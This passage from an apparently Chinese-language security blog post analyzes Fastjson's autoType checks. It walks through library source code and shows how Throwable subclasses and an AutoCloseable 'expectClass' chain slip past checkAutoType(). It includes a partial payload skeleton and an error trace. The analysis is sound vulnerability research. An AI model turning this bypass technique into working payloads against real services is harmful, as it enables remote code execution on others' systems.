class="line"></span><br><span class="line">    <span class="comment">// 消费完这个字符串 token 之后，推进到“下一个应当出现的 token”</span></span><br><span class="line">    <span class="comment">// 这里用 nextToken(JSONToken.COMMA) 的写法，是 Fastjson 的词法器优化：</span></span><br><span class="line">    <span class="comment">//   告诉 lexer “我期待下一个是逗号（或右花括号）”，从而高效跳转。</span></span><br><span class="line">    lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过 <code>checkAutoType()</code> 之后，将使用 <code>createException</code> 来创建异常类的实例。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Throwable</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// 准备要返回的异常对象引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (exClass == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果前面解析不到“异常的具体子类”（exClass 为 null），</span></span><br><span class="line">    <span class="comment">// 就退化为直接创建一个最普通的 java.lang.Exception 实例，</span></span><br><span class="line">    <span class="comment">// 把上一步解析出来的 message、cause 一并带进去。</span></span><br><span class="line">    ex = <span class="keyword">new</span> <span class="title class_">Exception</span>(message, cause);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果指定了 exClass（也就是你在 JSON 里声明了异常子类），</span></span><br><span class="line">    <span class="comment">// 先做一次“类型边界校验”：必须是 Throwable 的子类，否则立刻拒绝。</span></span><br><span class="line">    <span class="keyword">if</span> (!Throwable.class.isAssignableFrom(exClass)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match, not Throwable. &quot;</span> + exClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 关键：尝试“按需”去实例化你给的异常子类。</span></span><br><span class="line">        <span class="comment">// 这个 createException(...) 会按“常见构造器优先级”去找最合适的构造器，</span></span><br><span class="line">        <span class="comment">// 例如 (String, Throwable)、(String)、(Throwable)、() 等等。</span></span><br><span class="line">        ex = createException(message, cause, exClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果一个都没匹配上（或构造失败），兜底再回退到普通 Exception</span></span><br><span class="line">        <span class="keyword">if</span> (ex == <span class="literal">null</span>) &#123;</span><br><span class="line">            ex = <span class="keyword">new</span> <span class="title class_">Exception</span>(message, cause);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 任何反射创建过程出错，都包装成 fastjson 的 JSONException 抛出</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;create instance error&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createException</code> 会枚举异常类的常见构造方法，然后调用对应的构造方法实例化异常类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据给定的 message、cause 和异常子类 exClass，尝试用“常见构造器”创建 Throwable 实例</span></span><br><span class="line"><span class="keyword">private</span> Throwable <span class="title function_">createException</span><span class="params">(String message, Throwable cause, Class&lt;?&gt; exClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 这三个变量用来记录我们“发现到的”可用构造器（只记录其引用，最后再决定用谁）</span></span><br><span class="line">    Constructor&lt;?&gt; defaultConstructor = <span class="literal">null</span>;  <span class="comment">// 无参构造 ()</span></span><br><span class="line">    Constructor&lt;?&gt; messageConstructor = <span class="literal">null</span>;  <span class="comment">// 单参构造 (String)</span></span><br><span class="line">    Constructor&lt;?&gt; causeConstructor = <span class="literal">null</span>;    <span class="comment">// 双参构造 (String, Throwable)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只遍历“public 构造器”。注意：getConstructors() 不包括 protected/private 构造器</span></span><br><span class="line">    <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : exClass.getConstructors()) &#123;</span><br><span class="line">        Class&lt;?&gt;[] types = constructor.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 命中无参构造 ()</span></span><br><span class="line">        <span class="keyword">if</span> (types.length == <span class="number">0</span>) &#123;</span><br><span class="line">            defaultConstructor = constructor;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 命中 (String) 构造</span></span><br><span class="line">        <span class="keyword">if</span> (types.length == <span class="number">1</span> &amp;&amp; types[<span class="number">0</span>] == String.class) &#123;</span><br><span class="line">            messageConstructor = constructor;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 命中 (String, Throwable) 构造</span></span><br><span class="line">        <span class="keyword">if</span> (types.length == <span class="number">2</span> &amp;&amp; types[<span class="number">0</span>] == String.class &amp;&amp; types[<span class="number">1</span>] == Throwable.class) &#123;</span><br><span class="line">            causeConstructor = constructor;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 优先级 1：如果找到了 (String, Throwable) 构造，优先用它（信息最完整）</span></span><br><span class="line">    <span class="keyword">if</span> (causeConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (Throwable) causeConstructor.newInstance(message, cause);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 优先级 2：退而求其次，使用 (String) 构造（注意：此时 cause 信息会丢失）</span></span><br><span class="line">    <span class="keyword">if</span> (messageConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (Throwable) messageConstructor.newInstance(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 优先级 3：再退，使用无参构造（message 与 cause 都会丢失）</span></span><br><span class="line">    <span class="keyword">if</span> (defaultConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (Throwable) defaultConstructor.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果三个常见构造器都没有（或都是非 public），返回 null 让调用方兜底</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这就形成了 <code>Throwable</code> 子类绕过 <code>checkAutoType()</code> 的方式。我们需要找到 <code>Throwable</code> 的子类，这个类的 getter&#x2F;setter&#x2F;static block&#x2F;constructor 中含有具有威胁的代码逻辑。</p>
<h4 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h4><p>再来看 <code>JavaBeanDeserializer</code>，在 fastjson 中对大部分类都指定了特定的 deserializer，而 <code>AutoCloseable</code> 类没有，因此在 <code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer</code> 函数中，经过一系列判断最终返回的是 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        deserializer = createJavaBeanDeserializer(clazz, type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    putDeserializer(type, deserializer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deserializer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="MarshalOutputStream"><a href="#MarshalOutputStream" class="headerlink" title="MarshalOutputStream"></a>MarshalOutputStream</h5><p>具体来说我们可以构造下面这种结构的 payload：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span> <span class="comment">// java.lang.AutoCloseable 的子类</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>其中第一个 <code>&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;</code> 用于获取 <code>JavaBeanDeserializer</code>，这部分逻辑位于 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code> 中。</p>
<p>因为 <code>AutoCloseable</code> 是属于 fastjson 内置的白名单中，因此 <code>clazz = config.checkAutoType(typeName, null, lexer.getFeatures())</code> 这一步可以成功加载。</p>
<p>之后 <code>deserializer = config.getDeserializer(clazz)</code> 根据 <code>AutoCloseable</code> 获取反序列化器，感觉前面分析这里获取的是 <code>JavaBeanDeserializer</code>。</p>
<p>最后调用 <code>deserializer.deserialze(this, clazz, fieldName)</code> 完成后续的反序列化，这就执行到了 <code>JavaBeanDeserializer#deserialze</code> 的逻辑。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 命中“特殊键”判断分支：当 key 等于 JSON.DEFAULT_TYPE_KEY（默认 &quot;@type&quot;）且未禁用特殊键检测</span></span><br><span class="line"><span class="comment">// 进入“autoType（类型名重定向）”解析流程。</span></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 @type 的字符串值（按符号表扫描），例如：&quot;java.util.HashMap&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若启用了 IgnoreAutoType，则忽略 @type，不做类型重定向，继续按普通键值解析</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情况 A：如果当前已经有“候选对象”且其运行时类名与 typeName 完全一致，则直接复用该类</span></span><br><span class="line">    <span class="keyword">if</span> (object != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">        clazz = object.getClass();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 情况 B：否则，为了避免把纯数字误当作类名，先检查 typeName 是否全为数字</span></span><br><span class="line">        <span class="comment">// （有些场景 typeName 可能被写成数字 ID，此时不应当做类名解析）</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">allDigits</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeName.length(); ++i) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> typeName.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c &lt; <span class="string">&#x27;0&#x27;</span> || c &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                allDigits = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 仅当 typeName 非纯数字时，才进行 autoType 校验与类解析：</span></span><br><span class="line">        <span class="comment">// config.checkAutoType(...) 会按照白/黑名单与特性位（features）判定是否允许，</span></span><br><span class="line">        <span class="comment">// 通过后返回可用的 Class，否则抛异常或返回 null。</span></span><br><span class="line">        <span class="keyword">if</span> (!allDigits) &#123;</span><br><span class="line">            clazz = config.checkAutoType(typeName, <span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若此时仍未解析出有效 Class，说明：</span></span><br><span class="line">    <span class="comment">//  1) typeName 是纯数字（不参与 autoType），或</span></span><br><span class="line">    <span class="comment">//  2) autoType 未通过/未解析到类（返回 null 且未抛异常），</span></span><br><span class="line">    <span class="comment">// 则把 &quot;@type&quot;: &quot;xxx&quot; 当作普通键值写回到 map，后续继续常规解析。</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        map.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 走到这里：clazz 已确定。</span></span><br><span class="line">    <span class="comment">// 读取下一个 token，期望是逗号（COMMA）或右花括号（RBRACE）等。</span></span><br><span class="line">    lexer.nextToken(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 特例：如果紧跟着就是对象结束 &#x27;&#125;&#x27;，说明该对象形如：&#123;&quot;@type&quot;:&quot;xxx&quot;&#125;</span></span><br><span class="line">    <span class="comment">// 这种只携带类型名、不带任何字段的对象，尝试直接“构造实例并返回”。</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 走到这里：说明不是“&#123; &quot;@type&quot;: &quot;xxx&quot; &#125;”的极简形式，</span></span><br><span class="line">    <span class="comment">// 而是“&#123; &quot;@type&quot;: &quot;xxx&quot;, 还有其它字段... &#125;”。</span></span><br><span class="line">    <span class="comment">// 将解析状态切换为“类型名重定向”（TypeNameRedirect）：</span></span><br><span class="line">    <span class="comment">// 这会影响后续 parseObject(...) 的读取流程（如期待下一个 key 为 &quot;val&quot; 等特定约定）。</span></span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析上下文修正：</span></span><br><span class="line">    <span class="comment">// 若当前上下文存在，且当前字段名与上下文字段名都不是 Integer（即不是数组/索引），</span></span><br><span class="line">    <span class="comment">// 则弹出一层上下文，避免后续类型重定向解析与原上下文产生混淆。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.context != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; fieldName != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; !(fieldName <span class="keyword">instanceof</span> Integer)</span><br><span class="line">            &amp;&amp; !(<span class="built_in">this</span>.context.fieldName <span class="keyword">instanceof</span> Integer)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.popContext();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 object（临时承载的 JSON 对象/Map）里已经有前面解析到的字段，</span></span><br><span class="line">    <span class="comment">// 则尝试把这些字段“投射/转换”为目标 clazz 的 JavaBean 对象，再继续解析剩余字段填充它。</span></span><br><span class="line">    <span class="keyword">if</span> (object.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 到这里：object 为空或未有有效字段。</span></span><br><span class="line">    <span class="comment">// 取出 clazz 对应的反序列化器，基于其具体类型微调 resolveStatus：</span></span><br><span class="line">    <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">deserClass</span> <span class="operator">=</span> deserializer.getClass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若反序列化器是 JavaBeanDeserializer 的“自定义子类”（非基类、非 ThrowableDeserializer），</span></span><br><span class="line">    <span class="comment">// 或者是 MapDeserializer，则无需保留“类型名重定向”状态，恢复为 NONE。</span></span><br><span class="line">    <span class="keyword">if</span> (JavaBeanDeserializer.class.isAssignableFrom(deserClass)</span><br><span class="line">            &amp;&amp; deserClass != JavaBeanDeserializer.class</span><br><span class="line">            &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> MapDeserializer) &#123;</span><br><span class="line">        <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最终：按确定的 deserializer 去反序列化成目标类型对象并返回</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</code> 中会针对后面的 <code>&quot;@type&quot;:&quot;sun.rmi.server.MarshalOutputStream&quot;</code>  获取对应的 <code>typeName</code> 然后调用 <code>config.checkAutoType</code> 加载类。</p>
<p>这里的 <code>expectClass</code> 的来源 <code>type</code> 实际上就是前面的 <code>deserializer.deserialze(this, clazz, fieldName)</code> 的 <code>clazz</code> 参数，也就是按照第一个 <code>@type</code> 的值 <code>java.lang.AutoCloseable</code> 加载的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7.3.2 多态：typeKey 或 &quot;@type&quot;</span></span><br><span class="line"><span class="keyword">if</span> ((typeKey != <span class="literal">null</span> &amp;&amp; typeKey.equals(key)) || JSON.DEFAULT_TYPE_KEY == key) &#123;</span><br><span class="line">    lexer.nextTokenWithColon(JSONToken.LITERAL_STRING); <span class="comment">// 读取类型名</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 忽略冗余类型名（就是当前类名）或全局关闭 autoType</span></span><br><span class="line">        <span class="keyword">if</span> (typeName.equals(beanInfo.typeName) || parser.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;</span><br><span class="line">                lexer.nextToken();</span><br><span class="line">                <span class="keyword">break</span>;                                <span class="comment">// 对象就此结束</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;                                 <span class="comment">// 否则跳过这个键，继续读其它字段</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先看 @JSONType(seeAlso=...) 是否有直达</span></span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> getSeeAlso(config, <span class="built_in">this</span>.beanInfo, typeName);</span><br><span class="line">        Class&lt;?&gt; userType = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (deserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 关键：带上“期望类型 expectClass”做 autoType 安全判定（临时白名单效应）</span></span><br><span class="line">            Class&lt;?&gt; expectClass = TypeUtils.getClass(type);</span><br><span class="line">            userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());</span><br><span class="line">            deserializer = parser.getConfig().getDeserializer(userType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将“同一个对象”的剩余部分交给“目标类型”的反序列化器去解析（类型重定向）</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">typedObject</span> <span class="operator">=</span> deserializer.deserialze(parser, userType, fieldName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若目标类也声明了 typeKey 字段，把真实类型名回填，保证序列化/反序列化可对称</span></span><br><span class="line">        <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">            <span class="type">JavaBeanDeserializer</span> <span class="variable">jd</span> <span class="operator">=</span> (JavaBeanDeserializer) deserializer;</span><br><span class="line">            <span class="keyword">if</span> (typeKey != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">FieldDeserializer</span> <span class="variable">typeKeyField</span> <span class="operator">=</span> jd.getFieldDeserializer(typeKey);</span><br><span class="line">                <span class="keyword">if</span> (typeKeyField != <span class="literal">null</span>) &#123;</span><br><span class="line">                    typeKeyField.setValue(typedObject, typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (T) typedObject;                      <span class="comment">// 多态对象构建完毕</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);     <span class="comment">// @type 后不是字符串 → 语法错误</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>sun.rmi.server.MarshalOutputStream</code> 实现了 <code>java.lang.AutoCloseable</code> 接口，因此可以通过第二次 <code>checkAutoType()</code> 的检测，成功加载 <code>MarshalOutputStream</code> 类并进入后续的实例化流程。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20FastJson/images/MarshalOutputStream.png"
                      alt="MarshalOutputStream"
                ></p>
<p>然而上述 payload 在虽然 <code>userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());</code> 这一步成功加载了 <code>MarshalOutputStream</code> 类，但是却在 <code>deserializer = parser.getConfig().getDeserializer(userType);</code> 这一步产生如下报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: default constructor not found. class sun.rmi.server.MarshalOutputStream</span><br><span class="line">    at com.alibaba.fastjson.util.JavaBeanInfo.build(JavaBeanInfo.java:558)</span><br><span class="line">    at com.alibaba.fastjson.parser.ParserConfig.createJavaBeanDeserializer(ParserConfig.java:915)</span><br><span class="line">    at com.alibaba.fastjson.parser.ParserConfig.getDeserializer(ParserConfig.java:832)</span><br><span class="line">    at com.alibaba.fastjson.parser.ParserConfig.getDeserializer(ParserConfig.java:565)</span><br><span class="line">    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:805)</span><br><span class="line">    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:288)</span><br><span class="line">    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)</span><br><span class="line">    at 